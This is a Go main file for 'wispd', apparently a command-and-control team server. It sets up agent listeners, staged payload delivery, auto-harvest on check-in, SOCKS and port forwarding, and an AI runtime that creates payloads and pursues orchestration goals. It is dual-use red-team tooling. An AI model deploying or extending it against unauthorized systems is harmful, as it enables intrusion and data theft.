package main

import (
	"crypto/ed25519"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"wispp/protocol"
	"wispp/server/internal/ai"
	"wispp/server/internal/api"
	"wispp/server/internal/core"
	"wispp/server/internal/db"
	"wispp/server/internal/filesvc"
	"wispp/server/internal/fserver"
	"wispp/server/internal/fwd"
	"wispp/server/internal/guard"
	"wispp/server/internal/listener"
	"wispp/server/internal/orchestration"
	"wispp/server/internal/payload"
	"wispp/server/internal/pluginstore"
	"wispp/server/internal/rcp"
	"wispp/server/internal/report"
	"wispp/server/internal/socks"
	"wispp/server/internal/stage"
)

var version = "v2.0-m7"

func main() {
	var (
		apiAddr   = flag.String("api", "127.0.0.1:9001", "operator API + SPA (localhost only)")
		dataDir   = flag.String("data", "./data", "runtime data dir (keys/psk/db/token)")
		profPath  = flag.String("profile", "", "malleable profile JSON imported as stored profile 'cli'")
		project   = flag.String("project", "default", "default project for new listeners")
		dbPath    = flag.String("db", "", "sqlite path (default <data>/wisp.db; 'none' disables)")
		sleepMS   = flag.Int("sleep", 5000, "default agent sleep (ms)")
		jitter    = flag.Int("jitter", 30, "default agent jitter (%)")
		tlsCert   = flag.String("tls-cert", "", "deprecated: use an https listener kind (auto self-signed)")
		tlsKey    = flag.String("tls-key", "", "deprecated: see -tls-cert")
		staticDir = flag.String("static", "", "serve React SPA from this dir (client/dist)")
		autoHarv  = flag.Bool("autoharvest", false, "auto-harvest task set on first check-in")
		fwdRate   = flag.Int("file-rate", 0, "Type3 per-job rate limit (MB/s, 0 = unlimited)")
		tmplDir   = flag.String("templates", "./templates", "pre-built agent/stager templates")
		stageTTL  = flag.Duration("stage-ttl", 60*time.Minute, "default Type4 stage token TTL")
		stageUses = flag.Int("stage-uses", 1, "default Type4 stage fetch allowance")
		stagePath = flag.String("stage-path", "/stage", "Type4 stage fetch path prefix")
		aiCfg     = flag.String("ai-config", "", "AI runtime config JSON (empty = disabled)")

		fsAddr   = flag.String("fserver-addr", "", "file-server bind addr (:8888; enables it at boot)")
		fsRoot   = flag.String("fserver-root", "", "share root dir (share/both modes)")
		fsHost   = flag.String("fserver-host", "", "advertised host for file links (empty = LAN IP)")
		fsMode   = flag.String("fserver-mode", "", "delivery|share|both (default both)")
		fsTLS    = flag.Bool("fserver-tls", false, "serve HTTPS (auto self-signed unless cert/key given)")
		fsCert   = flag.String("fserver-cert", "", "file-server TLS certificate PEM")
		fsKey    = flag.String("fserver-key", "", "file-server TLS private key PEM")
		fsConfig = flag.String("fserver-config", "", "JSON file-server config (flags override)")
		fsNoLand = flag.Bool("fserver-no-landing", false, "hide the /s/<token> landing page")
	)
	flag.Parse()
	_, _ = tlsCert, tlsKey

	if err := os.MkdirAll(*dataDir, 0o700); err != nil {
		log.Fatalf("wispd: %v", err)
	}
	priv, err := protocol.LoadOrGenerateRSAKey(filepath.Join(*dataDir, "server_key.pem"))
	if err != nil {
		log.Fatalf("wispd: server key: %v", err)
	}
	psk, err := loadOrCreateSecret(filepath.Join(*dataDir, "psk.key"), 16)
	if err != nil {
		log.Fatalf("wispd: psk: %v", err)
	}
	apiToken, err := loadOrCreateSecret(filepath.Join(*dataDir, "api.token"), 20)
	if err != nil {
		log.Fatalf("wispd: api token: %v", err)
	}
	var store *db.Store
	switch *dbPath {
	case "none":
	default:
		path := *dbPath
		if path == "" {
			path = filepath.Join(*dataDir, "wisp.db")
		}
		store, err = db.Open(path)
		if err != nil {
			log.Fatalf("wispd: db: %v", err)
		}
		defer store.DB.Close()
	}

	hub := core.NewHub(store)
	if store != nil {
		_ = store.MarkAllSessionsOffline() // stale rows from previous run → offline
		if err := hub.RestoreHistory(); err != nil {
			log.Printf("wispd: session history: %v", err)
		}
	}
	hub.StartReaper(5 * time.Second)
	defer hub.StopReaper()
	events := hub.Subscribe(64)
	defer hub.Unsubscribe(events)
	go func() {
		for ev := range events {
			fmt.Printf("[%s] %-5s %-8s %s\n", ev.Time.Format("15:04:05"), ev.Level, ev.Kind, ev.Text)
		}
	}()

	emit := func(level, kind, text string) { hub.Emit(level, kind, *project, "%s", text) }
	rcpHub := rcp.NewHub(psk, emit)
	stageSvc := stage.New(*stageTTL)
	if *stageUses > 0 {
		stageSvc.Uses = *stageUses
	}
	if err := stageSvc.SetPath(*stagePath); err != nil {
		log.Fatalf("wispd: %v", err)
	}
	if err := stageSvc.Persist(filepath.Join(*dataDir, "stage")); err != nil {
		log.Printf("wispd: stage persistence disabled: %v", err)
	}
	ban := guard.NewBan(time.Minute, 5, 0)
	var harvest []listener.HarvestTask
	if *autoHarv {
		harvest = listener.DefaultHarvest()
	}

	// profile file becomes a stored profile named "cli"
	if *profPath != "" && store != nil {
		b, err := os.ReadFile(*profPath)
		if err != nil {
			log.Fatalf("wispd: profile: %v", err)
		}
		if err := store.ProfileUpsert("cli", string(b)); err != nil {
			log.Fatalf("wispd: profile store: %v", err)
		}
	}

	mgr := listener.NewManager(listener.Deps{
		Hub: hub, PSK: psk, Priv: priv, RCP: rcpHub, Stage: stageSvc,
		Guard: ban, Harvest: harvest, DataDir: *dataDir, SleepMS: *sleepMS, Jitter: *jitter,
	}, store)

	_ = mgr.Restore() // previously-created listeners

	// plugin platform (plan §5): store + ed25519 verifying key
	plugins := &pluginstore.Store{Dir: filepath.Join(*dataDir, "plugins"), DB: store, Hub: hub, Stage: stageSvc}
	var pluginPubHex string
	if b, err := os.ReadFile(filepath.Join(*dataDir, "keys", "plugin.pub")); err == nil {
		pluginPubHex = strings.TrimSpace(string(b))
		plugins.Pubkey, _ = decodeEdPub(pluginPubHex)
	}
	payloadSvc := &payload.Service{
		PluginPubkey: pluginPubHex,
		TemplatesDir: *tmplDir,
		PayloadsDir:  filepath.Join(*dataDir, "payloads"),
		Stage:        stageSvc,
		Defaults: func(id string) ([]string, string, string, error) {
			if id == "" {
				sp, ok := mgr.AnyHTTP()
				if !ok {
					return nil, "", "", errors.New("no running http listener")
				}
				id = sp.ID
			}
			servers, uri, err := mgr.ServersFor(id)
			return servers, uri, psk, err
		},
		Profiles: func(name string) (*protocol.Profile, error) {
			p := mgr.ResolveProfile(name)
			if p.Name != name {
				return nil, fmt.Errorf("unknown profile %q", name)
			}
			return p, nil
		},
	}
	payloadSvc.Restore()
	aiRT := loadAI(*aiCfg, hub, store, payloadSvc)
	reports := &report.Gen{Hub: hub, Store: store, AI: aiRT, Mgr: mgr}
	goals := orchestration.New(hub, store, aiRT)
	forwards := fwd.New(rcpHub, store, func(level, text string) { hub.Emit(level, "forward", *project, "%s", text) })
	socksSvc := socks.New(rcpHub, store, func(level, text string) { hub.Emit(level, "forward", *project, "%s", text) })
	fsrv := fserver.New(store, func(level, text string) { hub.Emit(level, "fileserver", *project, "%s", text) }, *dataDir)
	if *fsAddr != "" || *fsConfig != "" {
		var cfg fserver.Config
		if *fsConfig != "" {
			b, err := os.ReadFile(*fsConfig)
			if err != nil {
				log.Fatalf("wispd: file-server config: %v", err)
			}
			if err := json.Unmarshal(b, &cfg); err != nil {
				log.Fatalf("wispd: file-server config: %v", err)
			}
		}
		if *fsAddr != "" {
			cfg.Addr = *fsAddr
			cfg.Enabled = true
		}
		if *fsRoot != "" {
			cfg.RootDir = *fsRoot
		}
		if *fsHost != "" {
			cfg.Host = *fsHost
		}
		if *fsMode != "" {
			cfg.Mode = *fsMode
		}
		if *fsTLS {
			cfg.UseTLS = true
		}
		if *fsNoLand {
			cfg.NoLanding = true
		}
		if *fsCert != "" {
			cfg.CertFile = *fsCert
		}
		if *fsKey != "" {
			cfg.KeyFile = *fsKey
		}
		if cfg.Enabled {
			if err := fsrv.Apply(cfg); err != nil {
				log.Fatalf("wispd: file server: %v", err)
			}
		}
	} else {
		fsrv.Restore()
	}
	files := filesvc.New(rcpHub, store, func(level, proj, text string) { hub.Emit(level, "file", proj, "%s", text) },
		filepath.Join(*dataDir, "files"))
	files.RateBps = *fwdRate * 1024 * 1024
	aiRT.PluginCaps = plugins.Caps

	apiHandler := (&api.DebugAPI{Hub: hub, Store: store, RCP: rcpHub, Files: files, Payloads: payloadSvc, AI: aiRT, Manager: mgr, Plugins: plugins, Reports: reports, Goals: goals, Forwards: forwards, Socks: socksSvc, FServer: fsrv, Token: apiToken}).Handler()
	if *staticDir != "" {
		apiHandler = serveSPA(apiHandler, *staticDir)
	}
	apiSrv := &http.Server{Addr: *apiAddr, Handler: apiHandler, ReadHeaderTimeout: 5 * time.Second}
	go func() {
		hub.Emit("info", "listener", *project, "operator API on http://%s (token=%s…)", *apiAddr, apiToken[:8])
		if err := apiSrv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatalf("wispd: api: %v", err)
		}
	}()

	fmt.Printf("wispd %s up — key=%d-bit data=%s db=%v listeners=%d\n",
		version, priv.N.BitLen(), *dataDir, store != nil, len(mgr.List()))
	if len(mgr.List()) == 0 {
		fmt.Println(`无监听器 — 团队服务不会自行开口；在「🔌 监听器」页签创建 HTTP/HTTPS/TCP/RCP`)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	<-sig
	hub.Emit("info", "listener", *project, "shutting down")
	for _, v := range mgr.List() {
		_ = mgr.Stop(v.ID)
	}
	_ = apiSrv.Close()
}

// loadOrCreateSecret keeps stable PSK/API tokens across restarts (0600).
func loadOrCreateSecret(path string, nbytes int) (string, error) {
	if b, err := os.ReadFile(path); err == nil {
		if s := strings.TrimSpace(string(b)); len(s) >= nbytes*2 {
			return s, nil
		}
	} else if !os.IsNotExist(err) {
		return "", err
	}
	b := make([]byte, nbytes)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	v := hex.EncodeToString(b)
	return v, os.WriteFile(path, []byte(v), 0o600)
}

// aiConfigFile → ai package owns the shape; kept here for env fallback logging.
func loadAI(path string, hub *core.Hub, store *db.Store, ps *payload.Service) *ai.Runtime {
	rt := &ai.Runtime{Hub: hub, Store: store, SavePath: path}
	rt.CreatePayload = func(os_, arch string, staged bool) (any, error) {
		m, err := ps.Create(payload.Spec{OS: os_, Arch: arch, Staged: staged})
		if err != nil {
			return nil, err
		}
		return m, nil
	}
	rt.Configure(ai.Config{Enabled: false})
	if path == "" {
		return rt
	}
	b, err := os.ReadFile(path)
	if err != nil {
		log.Printf("wispd: ai config: %v (AI disabled)", err)
		return rt
	}
	rt.Configure(ai.ParseConfig(b))
	return rt
}

// serveSPA hosts the built React console on the same origin as /api,
// with the standard index.html fallback for client-side routes.
func serveSPA(api http.Handler, dir string) http.Handler {
	dir = filepath.FromSlash(dir) // keep Join/Clean output comparable on Windows
	fs := http.FileServer(http.Dir(dir))
	index := filepath.Join(dir, "index.html")
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/api" || strings.HasPrefix(r.URL.Path, "/api/") {
			api.ServeHTTP(w, r)
			return
		}
		rel := filepath.Clean(filepath.FromSlash(r.URL.Path))
		p := filepath.Join(dir, rel)
		if !strings.HasPrefix(p, dir) {
			http.NotFound(w, r) // traversal guard
			return
		}
		if _, err := os.Stat(p); err != nil {
			// A missing hashed asset must 404. Falling back to index.html makes
			// a stale tab execute HTML as a module and white-screen.
			if strings.HasPrefix(r.URL.Path, "/assets/") || filepath.Ext(r.URL.Path) != "" {
				http.NotFound(w, r)
				return
			}
			w.Header().Set("Cache-Control", "no-cache")
			http.ServeFile(w, r, index)
			return
		}
		if strings.HasPrefix(r.URL.Path, "/assets/") {
			w.Header().Set("Cache-Control", "public, max-age=31536000, immutable")
		} else if r.URL.Path == "/" || r.URL.Path == "/index.html" {
			w.Header().Set("Cache-Control", "no-cache")
		}
		fs.ServeHTTP(w, r)
	})
}

func decodeEdPub(hexStr string) (ed25519.PublicKey, error) {
	b, err := hex.DecodeString(hexStr)
	return b, err
}
